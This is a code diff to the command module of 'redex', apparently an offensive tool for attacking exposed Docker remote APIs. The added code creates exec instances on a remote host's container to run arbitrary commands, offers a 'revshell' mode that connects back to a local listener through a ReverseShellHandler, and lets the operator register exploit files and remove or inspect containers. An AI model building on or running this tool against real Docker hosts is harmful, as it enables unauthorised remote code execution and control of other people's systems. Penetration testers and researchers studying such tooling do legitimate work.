@@ -1,13 +1,15 @@
 import json
-import requests
 import rich
 
 from dataclasses import dataclass
-from typing import Callable, Optional, Dict, Any
+from typing import Callable, Optional
+from pathlib import Path
 
 from redex.network.portscan import PortScanner
+from redex.network.revshell import ReverseShellHandler
 from redex.utils.constants import *
 from redex.network.docker import *
+from redex.data.exploit import Exploit
 
 
 @dataclass
@@ -30,10 +32,10 @@ class Command(object):
     desc : str
     func : Optional[Callable] = None
 
-    def __str__(self) -> str:
+    def tostr(self, verbose: bool) -> str:
         s = \
           f"{self.name} - Usage: {self.cmd}\n" + \
-          f"    {self.desc}\n"
+          f"    {self.desc}\n" if verbose else f"{self.name}"
 
         return s
     
@@ -51,7 +53,7 @@ def help_cmd(redex_cls, *args, **kwargs) -> None:
     for cmd_name, cmd_object in commands.items():
         if cmd_name.lower() not in filters: continue
         if not isinstance(cmd_object, Command): continue
-        c.print(cmd_object.__str__())
+        c.print(cmd_object.tostr(True))
 
 
 C_HELP = Command(C_HELP_NAME, C_HELP_CMD, C_HELP_DESC, func=help_cmd)
@@ -121,7 +123,7 @@ def show_cmd(redex_cls, *args, **kwargs) -> None:
             redex_cls.console.print(value)
             continue
 
-        redex_cls.console.print(f"{attr} = {value} (type={type(value)})")
+        redex_cls.console.print(f"{attr} = {str(value)}")
 
 
 C_SHOW = Command(C_SHOW_NAME,C_SHOW_CMD, C_SHOW_DESC,func=show_cmd)
@@ -345,24 +347,162 @@ def lstconts_cmd(redex_cls, *args, **kwargs) -> None:
 C_LSTCONTS = Command(C_LSTCONTS_NAME,C_LSTCONTS_CMD, C_LSTCONTS_DESC, func=lstconts_cmd)
 lstconts_cmd.__doc__ = C_LSTCONTS.desc
 
+## ------------------------- REMOVE COMMAND ------------------------
+def remove_cmd(redex_cls, *args, **kwargs) -> None:
+    if len(args) > 0:
+        names = list(args)[0].split("=")[-1].split(",")
+    else:
+        names = [redex_cls.session.s_name]
+    
+    send_request_remove_containers(
+        redex_cls.session.s_rhost, redex_cls.session.s_rport, names
+    )
+
+
+C_REMOVE = Command(C_REMOVE_NAME, C_REMOVE_CMD, C_REMOVE_DESC, func=remove_cmd)
+remove_cmd.__doc__ = C_REMOVE.desc
+
+## ------------------------- INSPECT COMMAND ------------------------
+def inspect_cmd(redex_cls, *args, **kwargs) -> None:
+    if len(args) > 0:
+        names = list(args)[0].split("=")[-1].split(",")
+    else:
+        names = [redex_cls.session.s_name]
+
+    send_request_inspect_containers(
+        redex_cls.session.s_rhost, redex_cls.session.s_rport, names
+    )
+
+
+C_INSPECT = Command(C_INSPECT_NAME, C_INSPECT_CMD, C_INSPECT_DESC, func=inspect_cmd)
+inspect_cmd.__doc__ = C_INSPECT.desc
+
+## ------------------------- EXECUTE COMMAND ------------------------
+def execute_cmd(redex_cls, *args, **kwargs) -> None:
+    command = redex_cls.session.s_command 
+    if len(args) == 1 and "=" in args[0]: command = args[0].split("=")[-1]
+    command_arguments = []
+
+    # Check if command is either one between reverse shell or upload
+    match command:
+        case "revshell":
+            command_arguments = [redex_cls.session.s_lhost, redex_cls.session.s_lport]
+        case "upload":
+            command_arguments = [args[0], args[1]]
+        case _: pass
+
+    # Format the command if it is one of the default ones
+    cmd = command
+    if command in redex_cls.command_types:
+        cmd = redex_cls.command_types[command].format(*command_arguments)
+
+    command_exec_data = redex_cls.container_data.c_default['exec']
+    command_exec_data["Cmd"][2] = f'{cmd}'
+    
+    redex_cls.console.print(f"[*] Executing command: [yellow]'{cmd}'[/yellow]")
+
+    # Let's send the request to create the execution instance
+    exec_id = send_request_create_exec(
+        redex_cls.session.s_rhost, redex_cls.session.s_rport,
+        command_exec_data, redex_cls.session.s_name
+    )
+    redex_cls.console.print(f"[*] [green]Exec instance created with ID[/green]: \n{exec_id}")
+
+    if command == "revshell":
+        try:
+            addr = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
+            rvshell = ReverseShellHandler(redex_cls.session.s_lhost, redex_cls.session.s_lport)
+            rvshell.handle_rv( redex_cls.container_data.c_default["exec_start"], addr, exec_id)
+            return None
+        except Exception as e:
+            print(e)
+
+    send_request_start_exec(
+        redex_cls.session.s_rhost, redex_cls.session.s_rport,
+        exec_id, redex_cls.container_data.c_default
+    )
+
+    return None
+
+
+C_EXECUTE = Command(C_EXECUTE_NAME,C_EXECUTE_CMD, C_EXECUTE_DESC, func=execute_cmd)
+execute_cmd.__doc__ = C_EXECUTE.desc
+
+## ------------------------- UPLOAD COMMAND ------------------------
+def upload_cmd(redex_cls, *args, **kwargs) -> None:
+    ...
+
+C_UPLOAD = Command(C_UPLOAD_NAME, C_UPLOAD_CMD, C_UPLOAD_DESC, func=upload_cmd)
+upload_cmd.__doc__ = C_UPLOAD.desc
+
+## ------------------------- USE COMMAND ------------------------
+def use_cmd(redex_cls, *args, **kwargs) -> None:
+    ...
+
+C_USE = Command(C_USE_NAME, C_USE_CMD, C_USE_DESC, func=use_cmd)
+use_cmd.__doc__ = C_USE.desc
+
+## ------------------------- ADDEXPLOIT COMMAND ------------------------
+def addexploit_cmd(redex_cls, *args, **kwargs) -> None:
+    # Check that all required arguments have been given
+    if len(args) < 1:
+        redex_cls.console.print(
+            "[red]NAME and FILE arguments are both required![/red]"
+        )
+        return
+
+    # Obtain the given arguments and checks that the exploit
+    # actually exists in the local host system
+    exploit_name, exploit_path = args[0].split()
+    exploit_path = Path(exploit_path).absolute()
+    if not exploit_path.exists():
+        redex_cls.console.print(f"[red]{exploit_path} does not exists![/red]")
+        return
+    
+    exploit_data = Exploit(exploit_path)
+    setattr(redex_cls.exploit_hdl, exploit_name, exploit_data)
+    redex_cls.console.print(f"Added new exploit {exploit_name} -> {exploit_path}")
+
+
+C_ADDEXPLOIT = Command(C_ADDEXPLOIT_NAME,C_ADDEXPLOIT_CMD, C_ADDEXPLOIT_DESC, func=addexploit_cmd)
+addexploit_cmd.__doc__ = C_ADDEXPLOIT.desc
+
+## ------------------------- SHOWCMD COMMAND ------------------------
+def showcmd_cmd(redex_cls, *args, **kwargs) -> None:
+    commands = redex_cls.commands.__dict__
+    c = rich.console.Console(color_system="truecolor")
+    for _, cmd_object in commands.items():
+        if not isinstance(cmd_object, Command): continue
+        c.print(cmd_object.tostr(False))
+
+
+C_SHOWCMD = Command(C_SHOWCMD_NAME, C_SHOWCMD_CMD, C_SHOWCMD_DESC, func=showcmd_cmd)
+showcmd_cmd.__doc__ = C_SHOWCMD.desc
 
 
 @dataclass(frozen=True)
 class RedexCommands(object):
-    HELP     : Command = C_HELP
-    CLEAR    : Command = C_CLEAR
-    QUIT     : Command = C_QUIT
-    SET      : Command = C_SET
-    SETDATA  : Command = C_SETDATA
-    SHOW     : Command = C_SHOW
-    SHOWDATA : Command = C_SHOWDATA
-    SCAN     : Command = C_SCAN
-    LSTIMGS  : Command = C_LSTIMGS
-    PULL     : Command = C_PULL
-    CREATE   : Command = C_CREATE
-    START    : Command = C_START
-    STOP     : Command = C_STOP
-    LSTCONTS : Command = C_LSTCONTS
+    HELP       : Command = C_HELP
+    CLEAR      : Command = C_CLEAR
+    QUIT       : Command = C_QUIT
+    SET        : Command = C_SET
+    SETDATA    : Command = C_SETDATA
+    SHOW       : Command = C_SHOW
+    SHOWDATA   : Command = C_SHOWDATA
+    SCAN       : Command = C_SCAN
+    LSTIMGS    : Command = C_LSTIMGS
+    PULL       : Command = C_PULL
+    CREATE     : Command = C_CREATE
+    START      : Command = C_START
+    STOP       : Command = C_STOP
+    LSTCONTS   : Command = C_LSTCONTS
+    REMOVE     : Command = C_REMOVE
+    INSPECT    : Command = C_INSPECT
+    UPLOAD     : Command = C_UPLOAD
+    USE        : Command = C_USE
+    ADDEXPLOIT : Command = C_ADDEXPLOIT
+    SHOWCMD    : Command = C_SHOWCMD
+    EXECUTE    : Command = C_EXECUTE
 
     def __getitem__(self, key: str) -> Command:
         """ Returns the corresponding command """
